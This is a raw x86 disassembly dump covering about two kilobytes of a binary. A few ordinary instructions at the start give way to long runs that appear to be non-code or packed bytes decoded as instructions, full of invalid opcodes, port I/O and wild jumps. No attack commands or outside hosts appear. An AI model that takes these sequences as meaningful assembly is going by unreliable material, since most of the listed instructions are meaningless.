  42d811:	mov    ecx,DWORD PTR [ebp-0x24]
  42d814:	sub    eax,ecx
  42d816:	mov    ecx,DWORD PTR [ebp-0x34]
  42d819:	mov    DWORD PTR [ecx],eax
  42d81b:	mov    eax,DWORD PTR [ebp-0x34]
  42d81e:	mov    eax,DWORD PTR [eax]
  42d820:	or     eax,0xf89c8590
  42d825:	jmp    0x42fbb7
  42d82a:	out    0xea,al
  42d82c:	sub    edx,DWORD PTR [ebx-0x1199adc9]
  42d832:	add    eax,0xf8e63064
  42d837:	sub    BYTE PTR [edi-0x41],al
  42d83a:	or     dh,dh
  42d83c:	jns    0x42d8b9
  42d83e:	out    dx,al
  42d83f:	cwde   
  42d840:	jnp    0x42d8bd
  42d842:	cli    
  42d843:	add    esi,eax
  42d845:	jmp    0xfaea:0xbc8c901
  42d84c:	int3   
  42d84d:	loopne 0x42d838
  42d84f:	mov    eax,0xcbc4dde8
  42d854:	mov    bl,0xd7
  42d856:	out    0xb1,al
  42d858:	fsubr  st,st(7)
  42d85a:	(bad)  
  42d85b:	xlat   BYTE PTR ds:[ebx]
  42d85c:	les    edi,FWORD PTR [esi-0x12a2114]
  42d862:	fprem1 
  42d864:	shl    ebx,1
  42d866:	fild   DWORD PTR [edx]
  42d868:	ror    BYTE PTR [ecx],1
  42d86a:	hlt    
  42d86b:	(bad)  
  42d86d:	int    0xcf
  42d86f:	in     al,dx
  42d870:	mov    cl,0xc1
  42d873:	mov    esp,0xe9e6b2cc
  42d878:	mov    ebx,0xf1b5d5c4
  42d87d:	cli    
  42d87e:	dec    esp
  42d880:	add    ah,cl
  42d882:	rol    edx,0xf2
  42d885:	icebp  
  42d886:	or     cl,BYTE PTR [edx]
  42d888:	out    dx,eax
  42d889:	push   cs
  42d88a:	enter  0xcae2,0xdb
  42d88e:	icebp  
  42d88f:	out    dx,al
  42d890:	shr    cl,0xeb
  42d893:	iret   
  42d894:	shr    ch,1
  42d896:	neg    cl
  42d898:	jmp    0xdbcf:0xf2b4cefe
  42d89f:	hlt    
  42d8a0:	loop   0x42d88e
  42d8a2:	cmc    
  42d8a3:	loopne 0x42d87c
  42d8a5:	add    edx,ebx
  42d8a7:	rol    DWORD PTR [edi],0xe7
  42d8aa:	rol    ah,0xee
  42d8ad:	or     ecx,edx
  42d8af:	mov    edi,0xf0e8f2d0
  42d8b4:	ret    0xfbb7
  42d8b7:	rcr    bl,0xd0
  42d8ba:	cmc    
  42d8bb:	mov    bl,0xd6
  42d8bd:	int    0xe8
  42d8bf:	fadd   st(0),st
  42d8c1:	rcr    esi,cl
  42d8c3:	add    ah,bl
  42d8c5:	repnz or bl,bh
  42d8c8:	(bad)  
  42d8ca:	hlt    
  42d8cb:	jmp    0xc936a6b2
  42d8d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d8d1:	rcl    dl,0xea
  42d8d4:	stos   BYTE PTR es:[edi],al
  42d8d5:	iret   
  42d8d6:	out    0xda,eax
  42d8d8:	(bad)  
  42d8d9:	mov    ecx,0xb1c8d1d6
  42d8de:	jmp    0xdd3299d9
  42d8e3:	fcmovbe st,st(7)
  42d8e5:	xlat   BYTE PTR ds:[ebx]
  42d8e6:	in     al,0xf0
  42d8e8:	lock jmp 0xa9cb:0xfae6e5cb
  42d8f0:	repz xlat BYTE PTR ds:[ebx]
  42d8f2:	rcl    edi,0xb4
  42d8f5:	repnz in al,0xcc
  42d8f8:	retf   0xd9c4
  42d8fb:	in     al,dx
  42d8fc:	clc    
  42d8fd:	cli    
  42d8fe:	xlat   BYTE PTR ds:[ebx]
  42d8ff:	ret    
  42d900:	imul   ebp
  42d902:	mov    esi,0xdcddf9fe
  42d907:	add    al,al
  42d909:	add    eax,0x30de9eb
  42d90e:	add    dh,BYTE PTR [edx-0x4a3a1924]
  42d914:	ret    
  42d915:	ror    ebx,cl
  42d917:	lock mov ah,0xd3
  42d91a:	vpsubusb ymm2,ymm6,ymm2
  42d91e:	cli    
  42d91f:	repz rol DWORD PTR [edi],cl
  42d922:	sti    
  42d923:	rol    DWORD PTR [ecx],1
  42d925:	jmp    0x42d908
  42d927:	aam    0xca
  42d929:	(bad)  
  42d92a:	loope  0x42d91a
  42d92c:	cli    
  42d92d:	or     BYTE PTR [edi],al
  42d92f:	in     eax,0xea
  42d931:	mov    bh,0xa8
  42d933:	mov    al,0xc5
  42d935:	shr    dh,cl
  42d937:	mov    ah,0xcf
  42d939:	(bad)  
  42d93a:	mov    ch,0xde
  42d93c:	iret   
  42d93d:	jecxz  0x42d908
  42d93f:	fsubr  st,st(0)
  42d941:	loop   0x42d902
  42d943:	add    dh,ah
  42d945:	(bad)  
  42d946:	icebp  
  42d947:	std    
  42d948:	add    dh,bh
  42d94a:	loop   0x42d938
  42d94c:	mov    cl,0xd3
  42d94f:	jecxz  0x42d902
  42d951:	rcl    ebx,1
  42d953:	loopne 0x42d926
  42d955:	mov    cl,0xda
  42d957:	(bad)  
  42d958:	aad    0xb0
  42d95a:	cmc    
  42d95b:	fidiv  DWORD PTR [esi+ebx*8-0xb2c3706]
  42d962:	add    bl,dh
  42d964:	rol    DWORD PTR [edi],0xe4
  42d967:	ret    0xd500
  42d96a:	retf   
  42d96b:	loope  0x42d93b
  42d96d:	pop    es
  42d96e:	adc    al,ah
  42d970:	lods   al,BYTE PTR ds:[esi]
  42d971:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d972:	loope  0x42d96b
  42d974:	loopne 0x42d92b
  42d976:	mov    ebx,0xb5d9ebc4
  42d97b:	mov    ebx,0xd9d8eade
  42d980:	std    
  42d981:	ret    
  42d982:	int    0xbe
  42d984:	cli    
  42d985:	(bad)  
  42d986:	(bad)  
  42d988:	clc    
  42d989:	rol    ch,0xea
  42d98c:	hlt    
  42d98d:	jmp    0xd12cc892
  42d992:	repz out 0xcc,eax
  42d995:	lods   al,BYTE PTR ds:[esi]
  42d996:	hlt    
  42d997:	(bad)  
  42d998:	repnz cmc 
  42d99a:	lods   al,BYTE PTR ds:[esi]
  42d99b:	cld    
  42d99c:	cmc    
  42d99d:	in     al,dx
  42d99e:	mov    edx,0xfbdde1bd
  42d9a3:	mov    esp,0xdccaf4f0
  42d9a8:	add    bh,al
  42d9aa:	push   es
  42d9ab:	loope  0x42d9a6
  42d9ad:	loop   0x42d9b0
  42d9af:	(bad)  
  42d9b0:	fcom   st(3)
  42d9b2:	rep lods al,BYTE PTR ds:[esi]
  42d9b4:	in     eax,dx
  42d9b5:	leave  
  42d9b6:	mov    dh,0xea
  42d9b8:	out    0xd6,eax
  42d9ba:	aad    0xb8
  42d9bc:	fcomip st,st(2)
  42d9be:	mov    esi,0xdad5f7e1
  42d9c3:	add    DWORD PTR [edi],eax
  42d9c5:	icebp  
  42d9c6:	rcr    dl,0xfe
  42d9c9:	fadd   DWORD PTR [edx]
  42d9cb:	loop   0x42d9a8
  42d9cd:	add    cl,BYTE PTR [edx]
  42d9cf:	mov    esi,0xc5cfecf1
  42d9d4:	fsubr  st(1),st
  42d9d6:	out    dx,al
  42d9d7:	(bad)
  42d9da:	lods   al,BYTE PTR ds:[esi]
  42d9db:	mov    ebx,0xddf8bab8
  42d9e0:	xlat   BYTE PTR ds:[ebx]
  42d9e1:	into   
  42d9e2:	mov    edi,0xfef8ffe1
  42d9e7:	out    0xc4,eax
  42d9e9:	mov    ebp,0xe0e7dad5
  42d9ee:	in     al,dx
  42d9ef:	fsubr  st(6),st
  42d9f1:	repnz shl ebp,cl
  42d9f4:	xlat   BYTE PTR ds:[ebx]
  42d9f5:	div    DWORD PTR [esi-0x8454746]
  42d9fb:	mov    ebp,0xc8ecfedd
  42da00:	aad    0xf4
  42da02:	ret    0xd1c1
  42da05:	stc    
  42da06:	(bad)  
  42da07:	std    
  42da08:	add    eax,0xbea06ee
  42da0d:	leave  
  42da0e:	fadd   st(6),st
  42da10:	sar    BYTE PTR [ebp+esi*8-0x1f241715],cl
  42da17:	hlt    
  42da18:	out    dx,eax
  42da19:	jmp    0x42da04
  42da1b:	(bad)  
  42da1d:	aad    0xca
  42da1f:	jmp    0xdb1fd41b
  42da24:	in     al,dx
  42da25:	jmp    0x42da11
  42da27:	loop   0x42d9f2
  42da29:	jmp    0xd105:0xe604fa01
  42da30:	int3   
  42da31:	lods   eax,DWORD PTR ds:[esi]
  42da32:	(bad)  
  42da33:	mov    ebp,0xeadbeac7
  42da38:	icebp  
  42da39:	mov    eax,0x3ced7ed
  42da3e:	mov    eax,0xd4d8bdd8
  42da43:	push   es
  42da44:	(bad)  
  42da45:	repnz clc 
  42da47:	retf   
  42da48:	fdiv   st(2),st
  42da4a:	out    dx,al
  42da4b:	cld    
  42da4c:	or     esp,ebx
  42da4e:	retf   
  42da4f:	in     eax,0xe1
  42da51:	mov    edi,0xd5f2b5d1
  42da56:	leave  
  42da57:	into   
  42da58:	int3   
  42da59:	out    0xba,eax
  42da5b:	fdivp  st(6),st
  42da5d:	mov    ah,0xcf
  42da5f:	clc    
  42da60:	int3   
  42da61:	(bad)  
  42da63:	shr    esp,0xdd
  42da66:	loope  0x42da51
  42da68:	add    ebx,edx
  42da6a:	(bad)  
  42da6b:	retf   
  42da6c:	in     al,dx
  42da6d:	jecxz  0x42da3a
  42da6f:	test   al,0xf2
  42da71:	mov    esi,0xd1c8cfbe
  42da76:	mov    edx,0xc8d9f1c9
  42da7b:	sar    ecx,cl
  42da7d:	(bad)  
  42da7f:	mov    eax,0xcdf9bef7
  42da84:	shr    ebx,1
  42da86:	mul    al
  42da88:	or     DWORD PTR [edx],ecx
  42da8a:	or     ebx,ebx
  42da8c:	or     ebx,edx
  42da8e:	pop    es
  42da8f:	repnz shr edx,0xea
  42da93:	scas   eax,DWORD PTR es:[edi]
  42da94:	out    dx,al
  42da95:	loop   0x42da8b
  42da97:	mov    ebx,0xdeefdbff
  42da9c:	sti    
  42da9d:	(bad)  
  42da9f:	int3   
  42daa0:	shr    ch,cl
  42daa2:	lock sar bh,1
  42daa5:	les    edi,FWORD PTR [eax-0x3720341f]
  42daab:	hlt    
  42daac:	in     eax,0xcf
  42daae:	add    al,0xc0
  42dab0:	test   al,0xc5
  42dab2:	(bad)  
  42dab4:	repnz fcmove st,st(2)
  42dab7:	(bad)  
  42dab8:	mov    ecx,0xd6fecdfe
  42dabd:	sti    
  42dabe:	idiv   DWORD PTR [edx-0x8470438]
  42dac4:	out    0xfb,eax
  42dac6:	or     edi,esi
  42dac8:	std    
  42dac9:	out    0xfc,eax
  42dacb:	out    dx,eax
  42dacc:	fsubr  st,st(0)
  42dace:	add    esp,eax
  42dad0:	mov    al,0xf6
  42dad2:	retf   
  42dad3:	mov    dh,0xf2
  42dad5:	enter  0xd3f3,0xfa
  42dad9:	sar    ecx,1
  42dadb:	enter  0xd5ea,0xe9
  42dadf:	fcom   st(1)
  42dae1:	mov    esp,0xf9dbdbf8
  42dae6:	out    0xf5,eax
  42dae8:	add    edi,ecx
  42daea:	call   0xf229c0f6
  42daef:	repz icebp 
  42daf1:	jmp    0xfb1a8cbf
  42daf6:	mov    dh,0xf5
  42daf8:	lock fcomip st,st(5)
  42dafb:	retf   0xe2f1
  42dafe:	not    edx
  42db00:	int    0xb5
  42db02:	hlt    
  42db03:	hlt    
  42db04:	cli    
  42db05:	out    0xa,al
  42db07:	(bad)  
  42db09:	or     bl,bl
  42db0b:	fxch   st(4)
  42db0d:	paddusw mm2,mm1
  42db10:	shl    dl,1
  42db12:	jmp    0xef269c02
  42db17:	(bad)  
  42db18:	mov    eax,0xd5ffb7d5
  42db1d:	fcmovnu st,st(2)
  42db1f:	loope  0x42daf7
  42db21:	int    0xe7
  42db23:	(bad)  
  42db24:	rcr    al,1
  42db26:	(bad)  
  42db27:	aam    0xdc
  42db29:	pop    es
  42db2a:	(bad)  
  42db2b:	fcmovu st,st(6)
  42db2d:	or     ah,bh
  42db2f:	test   eax,0xefd1c0c5
  42db34:	mov    dl,0xf3
  42db36:	shl    ch,cl
  42db38:	stc    
  42db39:	idiv   ebp
  42db3b:	clc    
  42db3c:	mov    esp,0xcebbdaf2
  42db41:	mov    ch,0xdd
  42db43:	mov    edi,0xffd80103
  42db48:	loopne 0x42db52
  42db4a:	stc    
  42db4b:	push   es
  42db4c:	out    0x5,al
  42db4e:	icebp  
  42db4f:	fsubrp st(2),st
  42db51:	imul   ah
  42db53:	ret    0xaced
  42db56:	mov    edx,0xcbdacaaf
  42db5b:	int3   
  42db5c:	(bad)  
  42db5d:	loop   0x42db5a
  42db5f:	(bad)  
  42db61:	mov    esi,0x603f9d7
  42db66:	fdecstp 
  42db68:	test   DWORD PTR [eax],0xffe706ea
  42db6e:	cld    
  42db6f:	ror    edi,cl
  42db71:	(bad)
  42db74:	loop   0x42db49
  42db76:	enter  0xcbd8,0xdf
  42db7a:	fcomp  st(6)
  42db7c:	int3   
  42db7d:	int3   
  42db7e:	ret    
  42db7f:	mov    bh,0xd2
  42db81:	stc    
  42db82:	(bad)  
  42db83:	hlt    
  42db84:	jmp    0x42db62
  42db86:	add    edi,esi
  42db88:	jecxz  0x42db70
  42db8a:	loope  0x42db54
  42db8c:	in     al,0xed
  42db8e:	jecxz  0x42db73
  42db90:	test   esp,0xc8ceecb2
  42db96:	rol    cl,1
  42db98:	icebp  
  42db99:	mov    edx,0xedfcb8c6
  42db9e:	loope  0x42db8d
  42dba0:	sar    eax,cl
  42dba2:	shr    esp,0x2
  42dba5:	loop   0x42db63
  42dba7:	jmp    0xeb47c491
  42dbac:	(bad)  
  42dbae:	loopne 0x42db9d
  42dbb0:	enter  0xcaac,0xc6
  42dbb4:	jmp    0xfaf9c68f
  42dbb9:	lock faddp st(4),st
  42dbbc:	mov    edx,0xe8d5dcbd
  42dbc1:	fdivr  st,st(7)
  42dbc3:	ret    0x1d3
  42dbc6:	(bad)  
  42dbc7:	aad    0xd5
  42dbc9:	jmp    0x42dba7
  42dbcb:	push   es
  42dbcc:	(bad)  
  42dbcd:	fild   WORD PTR [eiz*8-0xc432d3f]
  42dbd4:	lock iret 
  42dbd6:	mov    cl,0xb4
  42dbd8:	icebp  
  42dbd9:	in     eax,0xb5
  42dbdb:	repnz inc BYTE PTR [ebx]
  42dbde:	add    edx,edi
  42dbe0:	add    ah,bh
  42dbe2:	cld    
  42dbe3:	mov    edi,0xc9fbf2df
  42dbe9:	sti    
  42dbea:	loop   0x42dbd8
  42dbec:	loop   0x42dbd9
  42dbee:	int    0xd2
  42dbf0:	mov    al,0xd2
  42dbf2:	mov    cl,0xd0
  42dbf4:	mov    bl,0xfa
  42dbf6:	cmc    
  42dbf7:	sti    
  42dbf8:	out    dx,al
  42dbf9:	into   
  42dbfa:	clc    
  42dbfb:	fcmovbe st,st(1)
  42dbfd:	fcmovnbe st,st(1)
  42dbff:	fld    st(0)
  42dc01:	fchs   
  42dc03:	sti    
  42dc04:	rcl    dl,0xc1
  42dc07:	clc    
  42dc08:	cmc    
  42dc09:	(bad)  [eax]
  42dc0b:	out    0xda,eax
  42dc0d:	or     eax,0xb1edc4fd
  42dc12:	mov    bh,0xdd
  42dc14:	ror    dl,1
  42dc16:	mov    bh,0xd6
  42dc18:	retf   
  42dc19:	int    0xd9
  42dc1b:	aam    0xd5
  42dc1d:	call   esi
  42dc1f:	add    dl,dl
  42dc21:	out    0xcc,eax
  42dc23:	(bad)  
  42dc24:	cli    
  42dc25:	sti    
  42dc26:	loope  0x42dbf1
  42dc28:	lock neg esp
  42dc2b:	jmp    0xccea:0xa7cde4ea
  42dc32:	out    0xcf,al
  42dc34:	shl    ebx,1
  42dc36:	jmp    0x42dc00
  42dc38:	stc    
  42dc39:	(bad)  
  42dc3b:	(bad)  
  42dc3c:	not    edi
  42dc3e:	add    dl,dl
  42dc40:	loopne 0x42dc2e
  42dc42:	mov    DWORD PTR [esi],0xd9fcdf00
  42dc48:	loop   0x42dc35
  42dc4a:	out    dx,al
  42dc4b:	into   
  42dc4c:	(bad)  
  42dc4d:	out    0xe,al
  42dc4f:	mov    cl,0xe0
  42dc51:	icebp  
  42dc52:	mov    cl,0xc2
  42dc54:	fcomi  st,st(3)
  42dc56:	out    dx,eax
  42dc57:	in     al,dx
  42dc58:	mov    al,0xd8
  42dc5a:	call   0xf917d85e
  42dc5f:	mov    ebp,0xe7e0f4da
  42dc64:	pop    es
  42dc65:	add    al,0xff
  42dc67:	add    bh,ah
  42dc69:	std    
  42dc6a:	out    dx,eax
  42dc6b:	or     ecx,esp
  42dc6d:	in     eax,0x5
  42dc6f:	mov    edi,0xdcf3deeb
  42dc74:	iret   
  42dc75:	loop   0x42dc4b
  42dc77:	int    0xd1
  42dc79:	(bad)  
  42dc7a:	fxch   st(3)
  42dc7c:	leave  
  42dc7d:	icebp  
  42dc7e:	enter  0x3b8,0xb5
  42dc82:	cld    
  42dc83:	int    0xe1
  42dc85:	loop   0x42dc66
  42dc87:	jecxz  0x42dc74
  42dc89:	pop    es
  42dc8a:	(bad)  
  42dc8b:	clc    
  42dc8c:	cld    
  42dc8d:	add    eax,eax
  42dc8f:	leave  
  42dc90:	mov    eax,0xdbc7cae6
  42dc95:	in     eax,dx
  42dc96:	enter  0xe5f8,0xec
  42dc9a:	in     eax,dx
  42dc9b:	jmp    0x42dc65
  42dc9d:	fdivr  st(1),st
  42dc9f:	ret    0xbef9
  42dca2:	out    0xc0,al
  42dca4:	add    eax,0xe4f502d6
  42dca9:	fnstsw ax
  42dcab:	(bad)  
  42dcac:	fiadd  WORD PTR [eax]
  42dcae:	rcr    cl,cl
  42dcb0:	mov    esi,0xb3b2c8e8
  42dcb5:	mov    bh,0xe8
  42dcb7:	out    dx,eax
  42dcb8:	int    0xe5
  42dcba:	mov    dh,0xc9
  42dcbc:	repz iret 
  42dcbe:	mov    esi,0xc1def1ed
  42dcc3:	add    bh,bl
  42dcc5:	dec    dl
  42dcc7:	pop    es
  42dcc8:	add    BYTE PTR [ebp-0x2c2038fd],bh
  42dcce:	out    dx,al
  42dccf:	retf   0xadb8
  42dcd2:	mov    bl,0xd6
  42dcd4:	aam    0xa9
  42dcd6:	div    BYTE PTR [edx+esi*8-0x49371a1c]
  42dcdd:	mov    ebp,0xfdf6cebf
  42dce2:	loope  0x42dcda
  42dce4:	rcl    dh,cl
  42dce6:	vshufps xmm4,xmm3,xmm5,0xf9
  42dceb:	add    bh,cl
  42dced:	add    edx,edx
  42dcef:	mov    cl,0xb3
  42dcf2:	icebp  
  42dcf3:	out    0xe0,al
  42dcf5:	mov    bh,0xfa
  42dcf7:	mov    ah,0xda
  42dcf9:	retf   
  42dcfa:	aam    0xb6
  42dcfc:	cmc    
  42dcfd:	mov    ah,0xe9
  42dcff:	mov    edx,0xdaf7c1c1
  42dd04:	repnz out 0xf0,al
  42dd07:	jmp    0xddf9:0x4e7c5cb
  42dd0e:	add    dh,BYTE PTR [ecx-0xf521422]
  42dd14:	icebp  
  42dd15:	mov    ch,0xa8
  42dd17:	in     eax,0xc7
  42dd19:	idiv   al
  42dd1b:	(bad)  
  42dd1d:	in     eax,dx
  42dd1e:	ret    0xf7fd
  42dd21:	aam    0x7
  42dd23:	fcom   st(5)
  42dd25:	(bad)  
  42dd26:	cmc    
  42dd27:	(bad)  
  42dd29:	leave  
  42dd2a:	jmp    0x42dd28
  42dd2c:	int    0xe7
  42dd2e:	call   0xe9069bec
  42dd33:	in     eax,0xb4
  42dd35:	shr    dl,1
  42dd37:	shl    DWORD PTR [esi-0x234a373a],cl
  42dd3d:	cli    
  42dd3e:	icebp  
  42dd3f:	fadd   st,st(0)
  42dd41:	(bad)  
  42dd43:	lock in eax,0xe4
  42dd46:	fcmovnb st,st(7)
  42dd48:	add    al,BYTE PTR [ecx]
  42dd4a:	stc    
  42dd4b:	pop    es
  42dd4c:	or     eax,0xefe213e6
  42dd51:	xlat   BYTE PTR ds:[ebx]
  42dd52:	lods   al,BYTE PTR ds:[esi]
  42dd53:	leave  
  42dd54:	ret    
  42dd55:	shr    al,0xb6
  42dd58:	out    dx,eax
  42dd59:	leave  
  42dd5a:	retf   0xb5cd
  42dd5d:	enter  0xb701,0x1
  42dd61:	add    eax,esi
  42dd63:	mov    esp,0xd0d1ebf1
  42dd68:	xlat   BYTE PTR ds:[ebx]
  42dd69:	rol    esp,0xce
  42dd6c:	invd   
  42dd6e:	or     eax,esi
  42dd70:	jecxz  0x42dd63
  42dd72:	in     al,dx
  42dd73:	jmp    0x42dd49
  42dd75:	retf   0xe5ce
  42dd78:	hlt    
  42dd79:	out    0xb7,al
  42dd7b:	(bad)  
  42dd7d:	(bad)  
  42dd7f:	in     al,dx
  42dd80:	fdivr  QWORD PTR [ebx+edi*8-0x2328292b]
  42dd87:	jmp    0xe049e275
  42dd8c:	stc    
  42dd8d:	sti    
  42dd8e:	add    bl,bh
  42dd90:	loope  0x42dd40
  42dd92:	fsub   st(6),st
  42dd94:	(bad)
  42dd97:	in     eax,dx
  42dd98:	icebp  
  42dd99:	shr    bl,1
  42dd9b:	mov    ebx,0xfbeafdca
  42dda0:	icebp  
  42dda1:	out    dx,eax
  42dda2:	add    bh,bl
  42dda4:	loop   0x42dd9a
  42dda6:	push   es
  42dda7:	fcmovnbe st,st(0)
  42dda9:	add    esi,esp
  42ddab:	add    bh,ah
  42ddad:	or     eax,0xc0afec09
  42ddb2:	imul   cl
  42ddb4:	in     eax,0xef
  42ddb6:	out    dx,eax
  42ddb7:	mov    eax,0xd2ebb6ee
  42ddbd:	sar    ah,1
  42ddbf:	mov    edx,0xcdccd1fd
  42ddc4:	cld    
  42ddc5:	(bad)  
  42ddc6:	fdivp  st(6),st
  42ddc8:	aam    0xca
  42ddca:	into   
  42ddcb:	call   0xe429a8cb
  42ddd0:	out    dx,eax
  42ddd1:	fnsave [edi-0x45131611]
  42ddd7:	xlat   BYTE PTR ds:[ebx]
  42ddd8:	mov    eax,0xfbcff2d9
  42dddd:	call   ecx
  42dddf:	iret   
  42dde0:	fnsave [ebp-0xf010325]
  42dde6:	retf   
  42dde7:	in     eax,0xc8
  42dde9:	fstp   st(0)
  42ddeb:	dec    ch
  42dded:	fsub   st(5),st
  42ddef:	jmp    0x42ddb1
  42ddf1:	icebp  
  42ddf2:	(bad)  
  42ddf3:	div    DWORD PTR [esi-0x1b2c3d4b]
  42ddf9:	fsubr  st,st(7)
  42ddfb:	fcomi  st,st(6)
  42ddfd:	cli    
  42ddfe:	fdiv   st(3),st
  42de00:	fld    st(2)
  42de02:	(bad)  
  42de04:	repnz (bad) 
  42de06:	jmp    0x700:0x1e90ff7
  42de0d:	into   
  42de0e:	sar    BYTE PTR [edi-0x22195a2d],0xc8
  42de15:	aam    0xeb
  42de17:	div    dh
  42de19:	fsubp  st(1),st
  42de1b:	mov    edx,0xe0f8f8f6
  42de20:	add    esi,esi
  42de22:	cli    
  42de23:	test   al,0xd6
  42de26:	loop   0x42de31
  42de28:	fxtract 
  42de2a:	rcr    bl,0xda
  42de2d:	shl    esp,cl
  42de2f:	out    0xd8,eax
  42de31:	out    0xf0,eax
  42de33:	mov    cl,0xc4
  42de35:	repnz in eax,0xb6
  42de38:	xlat   BYTE PTR ds:[ebx]
  42de39:	in     al,0xf0
  42de3b:	mov    dh,0xc8
  42de3d:	cld    
  42de3e:	(bad)  
  42de40:	fdivr  QWORD PTR [ecx+0x3d2f805]
  42de46:	xlat   BYTE PTR ds:[ebx]
  42de47:	jmp    0xe3cf:0x60bc1c8
  42de4e:	in     al,0xe3
  42de50:	xlat   BYTE PTR ds:[ebx]
  42de51:	repz fdivrp st(1),st
  42de54:	lods   al,BYTE PTR ds:[esi]
  42de55:	int3   
  42de56:	in     eax,0xca
  42de58:	out    0xdf,eax
  42de5a:	std    
  42de5b:	mov    ebx,0xf5cafcbe
  42de60:	(bad)  
  42de61:	push   ebx
  42de63:	rol    DWORD PTR [edx],0xbd
  42de66:	pop    es
  42de67:	dec    BYTE PTR [edx]
  42de69:	jecxz  0x42de65
  42de6b:	call   0xc549aa36
  42de70:	jecxz  0x42de43
  42de72:	loope  0x42de43
  42de74:	loop   0x42de27
  42de76:	mov    cl,0xc6
  42de78:	xlat   BYTE PTR ds:[ebx]
  42de79:	leave  
  42de7a:	call   0xb119aa4d
  42de7f:	mov    edi,0xf3ecfab9
  42de84:	ret    
  42de85:	cmc    
  42de86:	(bad)  
  42de87:	fild   WORD PTR [esi]
  42de89:	add    al,0x1
  42de8b:	fcmovnb st,st(6)
  42de8d:	repz in al,dx
  42de8f:	loopne 0x42de74
  42de91:	lods   eax,DWORD PTR ds:[esi]
  42de92:	fmul   st(5),st
  42de94:	ret    0xe0e2
  42de97:	rcr    ebx,cl
  42de99:	enter  0xdeb7,0xd9
  42de9d:	fcmove st,st(7)
  42de9f:	add    edi,edi
  42dea1:	ret    
  42dea2:	stc    
  42dea3:	mov    ebx,0xe2c4c7ff
  42dea8:	ffree  st(6)
  42deaa:	aad    0xcf
  42deac:	jmp    0x42deab
  42deae:	in     eax,dx
  42deaf:	leave  
  42deb0:	lock ret 0xf0c0
  42deb4:	(bad)  
  42deb6:	lods   al,BYTE PTR ds:[esi]
  42deb7:	mov    cl,0xc8
  42deb9:	iret   
  42deba:	sti    
  42debb:	in     al,0xb4
  42debd:	aam    0xc3
  42debf:	std    
  42dec0:	loop   0x42de77
  42dec2:	shl    edx,cl
  42dec4:	(bad)  
  42dec5:	mov    esp,0xd4e5d6fe
  42deca:	or     dh,al
  42decc:	leave  
  42decd:	ffree  st(0)
  42decf:	in     al,0xee
  42ded1:	shr    al,1
  42ded3:	in     al,dx
  42ded4:	jmp    0xf914d2b9
  42ded9:	mov    bh,0xfe
  42dedb:	aam    0xfa
  42dedd:	fcom   st(6)
  42dedf:	ret    
  42dee0:	add    ecx,esi
  42dee2:	pop    es
  42dee3:	ret    0xc2fb
  42dee6:	jecxz  0x42deaf
  42dee8:	dec    DWORD PTR [esi]
  42deea:	leave  
  42deeb:	leave  
  42deec:	push   cs
  42deed:	fcmovu st,st(1)
  42deef:	iret   
  42def0:	icebp  
  42def1:	scas   eax,DWORD PTR es:[edi]
  42def2:	shl    esi,0xb4
  42def5:	leave  
  42def6:	shl    eax,1
  42def8:	stc    
  42def9:	mov    ah,0xea
  42defb:	(bad)  
  42defd:	mov    edx,0xedb8ccb9
  42df02:	push   es
  42df03:	rol    bh,1
  42df05:	fild   WORD PTR [eax]
  42df07:	(bad)  
  42df08:	fnsetpm(287 only) 
  42df0a:	loopne 0x42df05
  42df0c:	loope  0x42def2
  42df0e:	loope  0x42def6
  42df10:	ror    bh,1
  42df12:	aad    0xf7
  42df14:	icebp  
  42df15:	mov    al,0xca
  42df17:	into   
  42df18:	hlt    
  42df19:	fcmove st,st(6)
  42df1b:	fcmovne st,st(5)
  42df1d:	mov    ah,0xcd
  42df1f:	into   
  42df20:	int    0xc0
  42df22:	add    edi,ebx
  42df24:	or     eax,DWORD PTR [eax]
  42df26:	neg    ecx
  42df28:	add    DWORD PTR [esi+eax*1],eax
  42df2b:	out    dx,eax
  42df2c:	std    
  42df2d:	out    0x3,eax
  42df2f:	repnz into 
  42df31:	shl    ch,0xe1
  42df34:	scas   al,BYTE PTR es:[edi]
  42df35:	ror    edx,cl
  42df37:	(bad)  
  42df38:	ror    edx,1
  42df3a:	rcr    ebx,1
  42df3c:	fdiv   st,st(3)
  42df3e:	fxch   st(5)
  42df40:	add    ah,bh
  42df42:	jecxz  0x42df0a
  42df44:	add    dl,dl
  42df46:	in     al,0xdd
  42df48:	(bad)  
  42df49:	dec    dh
  42df4b:	(bad)  
  42df4c:	call   0xaafbc815
  42df51:	repz ret 
  42df53:	call   0xd91dba0e
  42df58:	retf   0xeee5
  42df5b:	mov    ch,0x3
  42df5d:	rcl    dl,1
  42df5f:	shr    ch,cl
  42df61:	pop    es
  42df62:	sar    BYTE PTR [ecx+eax*8+0xf09c1d0],1
  42df69:	psubusb mm3,mm1
  42df6c:	fcmove st,st(5)
  42df6e:	(bad)  
  42df70:	fsubr  st,st(4)
  42df72:	shl    ebx,0xc5
  42df75:	lock mov dh,0xe0
  42df78:	mov    al,0xde
  42df7a:	(bad)  
  42df7b:	mov    bh,0xf5
  42df7d:	out    dx,al
  42df7e:	stc    
  42df7f:	enter  0xf7dc,0xfb
  42df83:	add    ebp,edi
  42df85:	cld    
  42df86:	out    0xda,eax
  42df88:	(bad)  
  42df89:	cmc    
  42df8a:	pavgb  mm7,mm0
  42df8d:	std    
  42df8e:	add    BYTE PTR [ebp-0x35092c39],bh
  42df94:	mov    cl,0xfa
  42df96:	(bad)  
  42df97:	sti    
  42df98:	iret   
  42df99:	idiv   BYTE PTR [eax-0x1d3c2623]
  42df9f:	xlat   BYTE PTR ds:[ebx]
  42dfa0:	loop   0x42dfa3
  42dfa2:	sar    ecx,0xde
  42dfa5:	ret    0xeaf9
  42dfa8:	fdiv   st(2),st
  42dfaa:	(bad)  
  42dfab:	jecxz  0x42df8f
  42dfad:	enter  0xd1ed,0xbd
  42dfb1:	out    dx,al
  42dfb2:	leave  
  42dfb3:	shl    BYTE PTR [edx-0xf2e051a],0xb6
  42dfba:	mov    ah,0xed
  42dfbc:	std    
  42dfbd:	jmp    0xdcbc:0xd1d0f4fa
  42dfc4:	shr    dl,0xdc
  42dfc7:	add    DWORD PTR [eax],eax
  42dfc9:	add    cl,BYTE PTR ds:0xe3dfeafc
  42dfcf:	mov    edi,0xaeedf3cf
  42dfd4:	int3   
  42dfd5:	mov    ch,0xd5
  42dfd7:	in     al,0xf0
  42dfd9:	mov    ebx,0xf7d9edd8
  42dfde:	int3   
  42dfdf:	jmp    0xbd25cf9a
  42dfe4:	push   es
  42dfe5:	or     ebx,esi
  42dfe7:	sti    
  42dfe8:	add    al,0xeb
  42dfea:	fldln2 
  42dfec:	(bad)  
